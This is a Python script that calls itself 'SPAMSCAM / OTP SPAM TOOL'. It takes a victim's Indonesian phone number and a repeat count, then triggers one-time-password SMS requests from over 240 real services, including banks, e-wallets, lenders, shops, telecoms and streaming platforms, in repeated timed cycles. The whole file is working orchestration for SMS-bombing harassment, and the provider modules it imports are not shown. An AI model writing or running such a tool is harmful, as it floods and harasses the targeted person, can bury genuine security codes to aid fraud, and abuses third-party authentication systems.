from __future__ import annotations

import math
import re
import shutil
import time

from rich.console import Console
from rich.text import Text
from rich.theme import Theme

from provider.adakami_provider import send_otp as adakami_send_otp
from provider.indosaku_provider import send_otp as indosaku_send_otp
from provider.kredione_provider import send_otp as kredione_send_otp
from provider.rc_provider import send_otp as rc_send_otp
from provider.kreditnavigator_provider import send_otp as kreditnavigator_send_otp
from provider.shopee_provider import send_otp as shopee_send_otp
from provider.tokopedia_provider import send_otp as tokopedia_send_otp
from provider.lazada_provider import send_otp as lazada_send_otp
from provider.bukalapak_provider import send_otp as bukalapak_send_otp
from provider.blibli_provider import send_otp as blibli_send_otp
from provider.tiktokshop_provider import send_otp as tiktokshop_send_otp
from provider.zalora_provider import send_otp as zalora_send_otp
from provider.bhinneka_provider import send_otp as bhinneka_send_otp
from provider.elevenia_provider import send_otp as elevenia_send_otp
from provider.jdid_provider import send_otp as jdid_send_otp
from provider.orami_provider import send_otp as orami_send_otp
from provider.sociolla_provider import send_otp as sociolla_send_otp
from provider.beautyhaul_provider import send_otp as beautyhaul_send_otp
from provider.guardian_provider import send_otp as guardian_send_otp
from provider.watsons_provider import send_otp as watsons_send_otp
from provider.acehardware_provider import send_otp as acehardware_send_otp
from provider.informa_provider import send_otp as informa_send_otp
from provider.ikea_provider import send_otp as ikea_send_otp
from provider.uniqlo_provider import send_otp as uniqlo_send_otp
from provider.hm_provider import send_otp as hm_send_otp
from provider.adidas_provider import send_otp as adidas_send_otp
from provider.nike_provider import send_otp as nike_send_otp
from provider.shopback_provider import send_otp as shopback_send_otp
from provider.iprice_provider import send_otp as iprice_send_otp
from provider.carousell_provider import send_otp as carousell_send_otp
from provider.olx_provider import send_otp as olx_send_otp
from provider.alfamart_provider import send_otp as alfamart_send_otp
from provider.indomaret_provider import send_otp as indomaret_send_otp
from provider.superindo_provider import send_otp as superindo_send_otp
from provider.hypermart_provider import send_otp as hypermart_send_otp
from provider.transmart_provider import send_otp as transmart_send_otp
from provider.ramayana_provider import send_otp as ramayana_send_otp
from provider.matahari_provider import send_otp as matahari_send_otp
from provider.ruparupa_provider import send_otp as ruparupa_send_otp
from provider.mapemall_provider import send_otp as mapemall_send_otp
from provider.tokotalk_provider import send_otp as tokotalk_send_otp
from provider.sirclo_provider import send_otp as sirclo_send_otp
from provider.warungpintar_provider import send_otp as warungpintar_send_otp
from provider.sayurbox_provider import send_otp as sayurbox_send_otp
from provider.segari_provider import send_otp as segari_send_otp
from provider.tanihub_provider import send_otp as tanihub_send_otp
from provider.aruna_provider import send_otp as aruna_send_otp
from provider.erafone_provider import send_otp as erafone_send_otp
from provider.bca_provider import send_otp as bca_send_otp
from provider.mandiri_provider import send_otp as mandiri_send_otp
from provider.bri_provider import send_otp as bri_send_otp
from provider.bni_provider import send_otp as bni_send_otp
from provider.btn_provider import send_otp as btn_send_otp
from provider.cimbniaga_provider import send_otp as cimbniaga_send_otp
from provider.permata_provider import send_otp as permata_send_otp
from provider.danamon_provider import send_otp as danamon_send_otp
from provider.panin_provider import send_otp as panin_send_otp
from provider.ocbcnisp_provider import send_otp as ocbcnisp_send_otp
from provider.maybank_provider import send_otp as maybank_send_otp
from provider.bsi_provider import send_otp as bsi_send_otp
from provider.muamalat_provider import send_otp as muamalat_send_otp
from provider.bjb_provider import send_otp as bjb_send_otp
from provider.dki_provider import send_otp as dki_send_otp
from provider.blu_provider import send_otp as blu_send_otp
from provider.seabank_provider import send_otp as seabank_send_otp
from provider.bankjago_provider import send_otp as bankjago_send_otp
from provider.allobank_provider import send_otp as allobank_send_otp
from provider.rayabank_provider import send_otp as rayabank_send_otp
from provider.linebank_provider import send_otp as linebank_send_otp
from provider.superbank_provider import send_otp as superbank_send_otp
from provider.hibank_provider import send_otp as hibank_send_otp
from provider.motion_provider import send_otp as motion_send_otp
from provider.kreditplus_provider import send_otp as kreditplus_send_otp
from provider.fif_provider import send_otp as fif_send_otp
from provider.adira_provider import send_otp as adira_send_otp
from provider.baf_provider import send_otp as baf_send_otp
from provider.kredivo_provider import send_otp as kredivo_send_otp
from provider.akulaku_provider import send_otp as akulaku_send_otp
from provider.atome_provider import send_otp as atome_send_otp
from provider.indodana_provider import send_otp as indodana_send_otp
from provider.julo_provider import send_otp as julo_send_otp
from provider.uangme_provider import send_otp as uangme_send_otp
from provider.kreditpintar_provider import send_otp as kreditpintar_send_otp
from provider.danacita_provider import send_otp as danacita_send_otp
from provider.amartha_provider import send_otp as amartha_send_otp
from provider.modalrakyat_provider import send_otp as modalrakyat_send_otp
from provider.gopay_provider import send_otp as gopay_send_otp
from provider.ovo_provider import send_otp as ovo_send_otp
from provider.dana_provider import send_otp as dana_send_otp
from provider.linkaja_provider import send_otp as linkaja_send_otp
from provider.shopeepay_provider import send_otp as shopeepay_send_otp
from provider.jenius_provider import send_otp as jenius_send_otp
from provider.flip_provider import send_otp as flip_send_otp
from provider.xendit_provider import send_otp as xendit_send_otp
from provider.midtrans_provider import send_otp as midtrans_send_otp
from provider.nicepay_provider import send_otp as nicepay_send_otp
from provider.duitku_provider import send_otp as duitku_send_otp
from provider.iak_provider import send_otp as iak_send_otp
from provider.finpay_provider import send_otp as finpay_send_otp
from provider.oy_provider import send_otp as oy_send_otp
from provider.sakuku_provider import send_otp as sakuku_send_otp
from provider.paytren_provider import send_otp as paytren_send_otp
from provider.ipaymu_provider import send_otp as ipaymu_send_otp
from provider.espay_provider import send_otp as espay_send_otp
from provider.doku_provider import send_otp as doku_send_otp
from provider.westernunion_provider import send_otp as westernunion_send_otp
from provider.wise_provider import send_otp as wise_send_otp
from provider.moneygram_provider import send_otp as moneygram_send_otp
from provider.instarem_provider import send_otp as instarem_send_otp
from provider.kaspro_provider import send_otp as kaspro_send_otp
from provider.grab_provider import send_otp as grab_send_otp
from provider.gojek_provider import send_otp as gojek_send_otp
from provider.maxim_provider import send_otp as maxim_send_otp
from provider.indriver_provider import send_otp as indriver_send_otp
from provider.traveloka_provider import send_otp as traveloka_send_otp
from provider.tiketcom_provider import send_otp as tiketcom_send_otp
from provider.pegipegi_provider import send_otp as pegipegi_send_otp
from provider.airasia_provider import send_otp as airasia_send_otp
from provider.citilink_provider import send_otp as citilink_send_otp
from provider.lionair_provider import send_otp as lionair_send_otp
from provider.garuda_provider import send_otp as garuda_send_otp
from provider.batikair_provider import send_otp as batikair_send_otp
from provider.superairjet_provider import send_otp as superairjet_send_otp
from provider.jne_provider import send_otp as jne_send_otp
from provider.jnt_provider import send_otp as jnt_send_otp
from provider.sicepat_provider import send_otp as sicepat_send_otp
from provider.anteraja_provider import send_otp as anteraja_send_otp
from provider.ninja_provider import send_otp as ninja_send_otp
from provider.posindonesia_provider import send_otp as posindonesia_send_otp
from provider.tiki_provider import send_otp as tiki_send_otp
from provider.lionparcel_provider import send_otp as lionparcel_send_otp
from provider.wahana_provider import send_otp as wahana_send_otp
from provider.paxel_provider import send_otp as paxel_send_otp
from provider.lalamove_provider import send_otp as lalamove_send_otp
from provider.deliveree_provider import send_otp as deliveree_send_otp
from provider.borzo_provider import send_otp as borzo_send_otp
from provider.gosend_provider import send_otp as gosend_send_otp
from provider.grabexpress_provider import send_otp as grabexpress_send_otp
from provider.telkomsel_provider import send_otp as telkomsel_send_otp
from provider.indosat_provider import send_otp as indosat_send_otp
from provider.xl_provider import send_otp as xl_send_otp
from provider.tri_provider import send_otp as tri_send_otp
from provider.smartfren_provider import send_otp as smartfren_send_otp
from provider.byu_provider import send_otp as byu_send_otp
from provider.axis_provider import send_otp as axis_send_otp
from provider.telkom_provider import send_otp as telkom_send_otp
from provider.indihome_provider import send_otp as indihome_send_otp
from provider.biznet_provider import send_otp as biznet_send_otp
from provider.myrepublic_provider import send_otp as myrepublic_send_otp
from provider.firstmedia_provider import send_otp as firstmedia_send_otp
from provider.oxygen_provider import send_otp as oxygen_send_otp
from provider.pln_provider import send_otp as pln_send_otp
from provider.pdam_provider import send_otp as pdam_send_otp
from provider.pgng_provider import send_otp as pgng_send_otp
from provider.iconnet_provider import send_otp as iconnet_send_otp
from provider.mynet_provider import send_otp as mynet_send_otp
from provider.grabfood_provider import send_otp as grabfood_send_otp
from provider.gofood_provider import send_otp as gofood_send_otp
from provider.shopeefood_provider import send_otp as shopeefood_send_otp
from provider.mcdonalds_provider import send_otp as mcdonalds_send_otp
from provider.kfc_provider import send_otp as kfc_send_otp
from provider.pizzahut_provider import send_otp as pizzahut_send_otp
from provider.dominos_provider import send_otp as dominos_send_otp
from provider.burgerking_provider import send_otp as burgerking_send_otp
from provider.starbucks_provider import send_otp as starbucks_send_otp
from provider.fore_provider import send_otp as fore_send_otp
from provider.kopken_provider import send_otp as kopken_send_otp
from provider.janjijiwa_provider import send_otp as janjijiwa_send_otp
from provider.chatime_provider import send_otp as chatime_send_otp
from provider.netflix_provider import send_otp as netflix_send_otp
from provider.spotify_provider import send_otp as spotify_send_otp
from provider.vidio_provider import send_otp as vidio_send_otp
from provider.viu_provider import send_otp as viu_send_otp
from provider.disneyplus_provider import send_otp as disneyplus_send_otp
from provider.primevideo_provider import send_otp as primevideo_send_otp
from provider.iqiyi_provider import send_otp as iqiyi_send_otp
from provider.wetv_provider import send_otp as wetv_send_otp
from provider.crunchyroll_provider import send_otp as crunchyroll_send_otp
from provider.mobilelegends_provider import send_otp as mobilelegends_send_otp
from provider.pubgmobile_provider import send_otp as pubgmobile_send_otp
from provider.garena_provider import send_otp as garena_send_otp
from provider.steam_provider import send_otp as steam_send_otp
from provider.halodoc_provider import send_otp as halodoc_send_otp
from provider.klikdokter_provider import send_otp as klikdokter_send_otp
from provider.alodokter_provider import send_otp as alodokter_send_otp
from provider.ruangguru_provider import send_otp as ruangguru_send_otp
from provider.zenius_provider import send_otp as zenius_send_otp
from provider.quipper_provider import send_otp as quipper_send_otp
from provider.cakap_provider import send_otp as cakap_send_otp
from provider.skillacademy_provider import send_otp as skillacademy_send_otp
from provider.canva_provider import send_otp as canva_send_otp
from provider.figma_provider import send_otp as figma_send_otp
from provider.notion_provider import send_otp as notion_send_otp
from provider.zoom_provider import send_otp as zoom_send_otp
from provider.slack_provider import send_otp as slack_send_otp
from provider.google_provider import send_otp as google_send_otp
from provider.microsoft_provider import send_otp as microsoft_send_otp
from provider.aws_provider import send_otp as aws_send_otp
from provider.tokocrypto_provider import send_otp as tokocrypto_send_otp
from provider.pintu_provider import send_otp as pintu_send_otp
from provider.indodax_provider import send_otp as indodax_send_otp
from provider.pluang_provider import send_otp as pluang_send_otp
from provider.bibit_provider import send_otp as bibit_send_otp
from provider.ajaib_provider import send_otp as ajaib_send_otp
from provider.koinworks_provider import send_otp as koinworks_send_otp
from provider.adapundi_provider import send_otp as adapundi_send_otp
from provider.anythimeastro_provider import send_otp as anythimeastro_send_otp
from provider.auto2000_provider import send_otp as auto2000_send_otp
from provider.cmkclub_provider import send_otp as cmkclub_send_otp
from provider.duniagames_provider import send_otp as duniagames_send_otp
from provider.eiger_provider import send_otp as eiger_send_otp
from provider.eventtitans_provider import send_otp as eventtitans_send_otp
from provider.ktakilat_provider import send_otp as ktakilat_send_otp
from provider.mapclub_provider import send_otp as mapclub_send_otp
from provider.misteraladin_provider import send_otp as misteraladin_send_otp
from provider.norkaroots_provider import send_otp as norkaroots_send_otp
from provider.opaperapp_provider import send_otp as opaperapp_send_otp
from provider.plataran_provider import send_otp as plataran_send_otp
from provider.putrainformasi_provider import send_otp as putrainformasi_send_otp
from provider.rappi_provider import send_otp as rappi_send_otp
from provider.riva_provider import send_otp as riva_send_otp
from provider.samir_provider import send_otp as samir_send_otp
from provider.siloam_provider import send_otp as siloam_send_otp
from provider.singafintech_provider import send_otp as singafintech_send_otp
from provider.stokbit_provider import send_otp as stokbit_send_otp
from provider.talentgun_provider import send_otp as talentgun_send_otp
from provider.yupinfo_provider import send_otp as yupinfo_send_otp

COOLDOWN_SECONDS = 62

PROVIDERS: list[tuple[str, object]] = [
    ("AdaKami",          adakami_send_otp),
    ("Indosaku",         indosaku_send_otp),
    ("KrediOne",         kredione_send_otp),
    ("RupiahCepat",      rc_send_otp),
    ("KreditNavigator",  kreditnavigator_send_otp),
    ("Shopee",              shopee_send_otp),
    ("Tokopedia",           tokopedia_send_otp),
    ("Lazada",              lazada_send_otp),
    ("Bukalapak",           bukalapak_send_otp),
    ("Blibli",              blibli_send_otp),
    ("TikTok Shop",         tiktokshop_send_otp),
    ("Zalora",              zalora_send_otp),
    ("Bhinneka",            bhinneka_send_otp),
    ("Elevenia",            elevenia_send_otp),
    ("JD.ID",               jdid_send_otp),
    ("Orami",               orami_send_otp),
    ("Sociolla",            sociolla_send_otp),
    ("BeautyHaul",          beautyhaul_send_otp),
    ("Guardian",            guardian_send_otp),
    ("Watsons",             watsons_send_otp),
    ("Ace Hardware",        acehardware_send_otp),
    ("Informa",             informa_send_otp),
    ("IKEA",                ikea_send_otp),
    ("Uniqlo",              uniqlo_send_otp),
    ("H&M",                 hm_send_otp),
    ("Adidas",              adidas_send_otp),
    ("Nike",                nike_send_otp),
    ("ShopBack",            shopback_send_otp),
    ("iPrice",              iprice_send_otp),
    ("Carousell",           carousell_send_otp),
    ("OLX",                 olx_send_otp),
    ("Alfamart",            alfamart_send_otp),
    ("Indomaret",           indomaret_send_otp),
    ("Superindo",           superindo_send_otp),
    ("Hypermart",           hypermart_send_otp),
    ("Transmart",           transmart_send_otp),
    ("Ramayana",            ramayana_send_otp),
    ("Matahari",            matahari_send_otp),
    ("Ruparupa",            ruparupa_send_otp),
    ("MapeMall",            mapemall_send_otp),
    ("TokoTalk",            tokotalk_send_otp),
    ("Sirclo",              sirclo_send_otp),
    ("Warung Pintar",       warungpintar_send_otp),
    ("Sayurbox",            sayurbox_send_otp),
    ("Segari",              segari_send_otp),
    ("TaniHub",             tanihub_send_otp),
    ("Aruna",               aruna_send_otp),
    ("Erafone",             erafone_send_otp),
    ("BCA",                 bca_send_otp),
    ("Mandiri",             mandiri_send_otp),
    ("BRI",                 bri_send_otp),
    ("BNI",                 bni_send_otp),
    ("BTN",                 btn_send_otp),
    ("CIMB Niaga",          cimbniaga_send_otp),
    ("Permata Bank",        permata_send_otp),
    ("Danamon",             danamon_send_otp),
    ("Panin Bank",          panin_send_otp),
    ("OCBC NISP",           ocbcnisp_send_otp),
    ("Maybank",             maybank_send_otp),
    ("BSI",                 bsi_send_otp),
    ("Bank Muamalat",       muamalat_send_otp),
    ("Bank BJB",            bjb_send_otp),
    ("Bank DKI",            dki_send_otp),
    ("Blu",                 blu_send_otp),
    ("SeaBank",             seabank_send_otp),
    ("Bank Jago",           bankjago_send_otp),
    ("Allo Bank",           allobank_send_otp),
    ("Raya Bank",           rayabank_send_otp),
    ("LINE Bank",           linebank_send_otp),
    ("Superbank",           superbank_send_otp),
    ("HiBank",              hibank_send_otp),
    ("Motion Banking",      motion_send_otp),
    ("Kredit Plus",         kreditplus_send_otp),
    ("FIF",                 fif_send_otp),
    ("Adira",               adira_send_otp),
    ("BAF",                 baf_send_otp),
    ("Kredivo",             kredivo_send_otp),
    ("Akulaku",             akulaku_send_otp),
    ("Atome",               atome_send_otp),
    ("Indodana",            indodana_send_otp),
    ("Julo",                julo_send_otp),
    ("UangMe",              uangme_send_otp),
    ("Kredit Pintar",       kreditpintar_send_otp),
    ("Danacita",            danacita_send_otp),
    ("Amartha",             amartha_send_otp),
    ("Modal Rakyat",        modalrakyat_send_otp),
    ("GoPay",               gopay_send_otp),
    ("OVO",                 ovo_send_otp),
    ("DANA",                dana_send_otp),
    ("LinkAja",             linkaja_send_otp),
    ("ShopeePay",           shopeepay_send_otp),
    ("Jenius",              jenius_send_otp),
    ("Flip",                flip_send_otp),
    ("Xendit",              xendit_send_otp),
    ("Midtrans",            midtrans_send_otp),
    ("Nicepay",             nicepay_send_otp),
    ("Duitku",              duitku_send_otp),
    ("IAK",                 iak_send_otp),
    ("Finpay",              finpay_send_otp),
    ("OY Indonesia",        oy_send_otp),
    ("Sakuku",              sakuku_send_otp),
    ("PayTren",             paytren_send_otp),
    ("iPaymu",              ipaymu_send_otp),
    ("Espay",               espay_send_otp),
    ("DOKU",                doku_send_otp),
    ("Western Union",       westernunion_send_otp),
    ("Wise",                wise_send_otp),
    ("MoneyGram",           moneygram_send_otp),
    ("Instarem",            instarem_send_otp),
    ("Kaspro",              kaspro_send_otp),
    ("Grab",                grab_send_otp),
    ("Gojek",               gojek_send_otp),
    ("Maxim",               maxim_send_otp),
    ("inDrive",             indriver_send_otp),
    ("Traveloka",           traveloka_send_otp),
    ("Tiket.com",           tiketcom_send_otp),
    ("Pegipegi",            pegipegi_send_otp),
    ("AirAsia",             airasia_send_otp),
    ("Citilink",            citilink_send_otp),
    ("Lion Air",            lionair_send_otp),
    ("Garuda Indonesia",    garuda_send_otp),
    ("Batik Air",           batikair_send_otp),
    ("Super Air Jet",       superairjet_send_otp),
    ("JNE",                 jne_send_otp),
    ("J&T Express",         jnt_send_otp),
    ("SiCepat",             sicepat_send_otp),
    ("AnterAja",            anteraja_send_otp),
    ("Ninja Xpress",        ninja_send_otp),
    ("Pos Indonesia",       posindonesia_send_otp),
    ("TIKI",                tiki_send_otp),
    ("Lion Parcel",         lionparcel_send_otp),
    ("Wahana",              wahana_send_otp),
    ("Paxel",               paxel_send_otp),
    ("Lalamove",            lalamove_send_otp),
    ("Deliveree",           deliveree_send_otp),
    ("Borzo",               borzo_send_otp),
    ("GoSend",              gosend_send_otp),
    ("GrabExpress",         grabexpress_send_otp),
    ("Telkomsel",           telkomsel_send_otp),
    ("Indosat",             indosat_send_otp),
    ("XL Axiata",           xl_send_otp),
    ("Tri",                 tri_send_otp),
    ("Smartfren",           smartfren_send_otp),
    ("By.U",                byu_send_otp),
    ("AXIS",                axis_send_otp),
    ("Telkom Indonesia",    telkom_send_otp),
    ("IndiHome",            indihome_send_otp),
    ("Biznet",              biznet_send_otp),
    ("MyRepublic",          myrepublic_send_otp),
    ("First Media",         firstmedia_send_otp),
    ("Oxygen.id",           oxygen_send_otp),
    ("PLN",                 pln_send_otp),
    ("PDAM",                pdam_send_otp),
    ("PGN",                 pgng_send_otp),
    ("Iconnet",             iconnet_send_otp),
    ("MyNet",               mynet_send_otp),
    ("GrabFood",            grabfood_send_otp),
    ("GoFood",              gofood_send_otp),
    ("ShopeeFood",          shopeefood_send_otp),
    ("McDonald's",          mcdonalds_send_otp),
    ("KFC",                 kfc_send_otp),
    ("Pizza Hut",           pizzahut_send_otp),
    ("Domino's",            dominos_send_otp),
    ("Burger King",         burgerking_send_otp),
    ("Starbucks",           starbucks_send_otp),
    ("Fore Coffee",         fore_send_otp),
    ("Kopi Kenangan",       kopken_send_otp),
    ("Janji Jiwa",          janjijiwa_send_otp),
    ("Chatime",             chatime_send_otp),
    ("Netflix",             netflix_send_otp),
    ("Spotify",             spotify_send_otp),
    ("Vidio",               vidio_send_otp),
    ("Viu",                 viu_send_otp),
    ("Disney+ Hotstar",     disneyplus_send_otp),
    ("Prime Video",         primevideo_send_otp),
    ("iQIYI",               iqiyi_send_otp),
    ("WeTV",                wetv_send_otp),
    ("Crunchyroll",         crunchyroll_send_otp),
    ("Mobile Legends",      mobilelegends_send_otp),
    ("PUBG Mobile",         pubgmobile_send_otp),
    ("Garena",              garena_send_otp),
    ("Steam",               steam_send_otp),
    ("Halodoc",             halodoc_send_otp),
    ("KlikDokter",          klikdokter_send_otp),
    ("Alodokter",           alodokter_send_otp),
    ("Ruangguru",           ruangguru_send_otp),
    ("Zenius",              zenius_send_otp),
    ("Quipper",             quipper_send_otp),
    ("Cakap",               cakap_send_otp),
    ("Skill Academy",       skillacademy_send_otp),
    ("Canva",               canva_send_otp),
    ("Figma",               figma_send_otp),
    ("Notion",              notion_send_otp),
    ("Zoom",                zoom_send_otp),
    ("Slack",               slack_send_otp),
    ("Google",              google_send_otp),
    ("Microsoft",           microsoft_send_otp),
    ("AWS",                 aws_send_otp),
    ("Tokocrypto",          tokocrypto_send_otp),
    ("Pintu",               pintu_send_otp),
    ("Indodax",             indodax_send_otp),
    ("Pluang",              pluang_send_otp),
    ("Bibit",               bibit_send_otp),
    ("Ajaib",               ajaib_send_otp),
    ("KoinWorks",           koinworks_send_otp),
    ("Adapundi", adapundi_send_otp),
    ("AnyThime Astro", anythimeastro_send_otp),
    ("Auto 2000", auto2000_send_otp),
    ("CMK Club", cmkclub_send_otp),
    ("Dunia Games", duniagames_send_otp),
    ("Eiger", eiger_send_otp),
    ("EventTitans", eventtitans_send_otp),
    ("KTA Kilat", ktakilat_send_otp),
    ("MAP Club", mapclub_send_otp),
    ("Mister Aladin", misteraladin_send_otp),
    ("Norka Roots", norkaroots_send_otp),
    ("Opaper App", opaperapp_send_otp),
    ("Plataran Circle", plataran_send_otp),
    ("Putra Informasi", putrainformasi_send_otp),
    ("Rappi", rappi_send_otp),
    ("Riva", riva_send_otp),
    ("Samir", samir_send_otp),
    ("Siloam Hospital", siloam_send_otp),
    ("Singa Fintech", singafintech_send_otp),
    ("Stokbit", stokbit_send_otp),
    ("Talent Gun", talentgun_send_otp),
    ("Yup Info", yupinfo_send_otp),
]

_BLOCK_GLYPHS: dict[str, tuple[str, ...]] = {
    "S": ("███████╗", "██╔════╝", "███████╗", "╚════██║", "███████║", "╚══════╝"),
    "P": ("██████╗ ", "██╔══██╗", "██████╔╝", "██╔═══╝ ", "██║     ", "╚═╝     "),
    "A": (" █████╗ ", "██╔══██╗", "███████║", "██╔══██║", "██║  ██║", "╚═╝  ╚═╝"),
    "M": ("███╗   ███╗", "████╗ ████║", "██╔████╔██║", "██║╚██╔╝██║", "██║ ╚═╝ ██║", "╚═╝     ╚═╝"),
    "C": (" ██████╗", "██╔════╝", "██║     ", "██║     ", "╚██████╗", " ╚═════╝"),
}
_WORD = "SPAMSCAM"

THEME = Theme(
    {
        "accent": "cyan",
        "muted": "dim",
        "success": "green",
        "warning": "yellow",
        "error": "red bold",
    }
)

console = Console(theme=THEME, highlight=False, color_system="standard")


def _term_width() -> int:
    return min(88, shutil.get_terminal_size((88, 24)).columns)


def _build_block_rows(word: str) -> list[Text]:
    rows: list[Text] = []
    for row in range(6):
        line = Text()
        for letter in word:
            for ch in _BLOCK_GLYPHS[letter][row]:
                line.append(ch, "bold white" if ch == "█" else "dim")
        rows.append(line)
    return rows


def print_banner() -> None:
    width = _term_width()
    console.print()
    sample = "".join(_BLOCK_GLYPHS[c][0] for c in _WORD)
    if len(sample) <= width:
        for row in _build_block_rows(_WORD):
            console.print(row, width=width)
    else:
        console.print("SPAMSCAM", style="bold white")
    console.print()
    console.print("SPAMSCAM / OTP SPAM TOOL", style="bold")
    console.print("Multi-provider · Rotating cycle · Auto cooldown", style="muted")
    console.print()


def normalize_phone(value: str) -> str:
    value = re.sub(r"\D", "", value)
    if value.startswith("62"):
        value = "0" + value[2:]
    return value


def countdown(seconds: float) -> None:
    end = time.monotonic() + seconds
    while True:
        remaining = end - time.monotonic()
        if remaining <= 0:
            break
        mins, secs = divmod(math.ceil(remaining), 60)
        print(f"\r  Cooldown: {mins:02d}:{secs:02d} ...", end="", flush=True)
        time.sleep(min(0.5, remaining))
    print("\r" + " " * 30 + "\r", end="", flush=True)


def read_input() -> tuple[str, int] | None:
    no_hp = normalize_phone(input("  Nomor HP     : ").strip())

    if not re.fullmatch(r"08\d{8,14}", no_hp):
        console.print("\n  [!] Nomor HP tidak valid. Contoh: 08978397772\n", style="error")
        return None

    raw = input("  Jumlah resend : ").strip()
    try:
        jml_resend = int(raw) if raw else 0
    except ValueError:
        console.print("\n  [!] Jumlah resend harus berupa angka.\n", style="error")
        return None

    if jml_resend < 1:
        console.print("\n  [!] Jumlah resend minimal 1.\n", style="error")
        return None

    return no_hp, jml_resend


def run_cycle(no_hp: str, cycle: int, total: int) -> None:
    try:
        from provider._engine import reset_cycle as _reset_cycle

        _reset_cycle()  # siklus baru: memo + cooldown dibersihkan
    except Exception:
        pass
    width = _term_width()
    divider = "─" * min(50, width - 2)

    console.print()
    console.print(f"  {divider}", style="muted")
    header = Text()
    header.append(f"  Siklus {cycle}/{total}", style="bold accent")
    header.append(f"  ·  Target: {no_hp}", style="muted")
    console.print(header)
    console.print(f"  {divider}", style="muted")

    col_w = 32
    for name, send_fn in PROVIDERS:
        label = f"  Meminta request OTP ke {name}..."
        print(f"{label:{col_w}}", end="", flush=True)

        ok = False
        try:
            ok = send_fn(no_hp)  # type: ignore[call-arg]
        except Exception:  # pylint: disable=broad-except
            ok = False

        if ok:
            console.print("[ [success]OK[/success] ]")
        else:
            console.print("[ [error]Gagal[/error] ]")

    console.print(f"  {divider}", style="muted")


def main() -> None:
    print_banner()

    data = read_input()
    if data is None:
        return

    no_hp, jml_resend = data

    try:
        for i in range(1, jml_resend + 1):
            run_cycle(no_hp, i, jml_resend)

            if i < jml_resend:
                console.print(
                    f"\n  Cooldown {COOLDOWN_SECONDS} detik sebelum siklus berikutnya...",
                    style="muted",
                )
                countdown(COOLDOWN_SECONDS)

    except KeyboardInterrupt:
        console.print("\n\n  [!] Dibatalkan oleh pengguna.\n", style="warning")
        return

    console.print("\n  Selesai. Semua siklus telah dijalankan.\n", style="success")


if __name__ == "__main__":
    main()
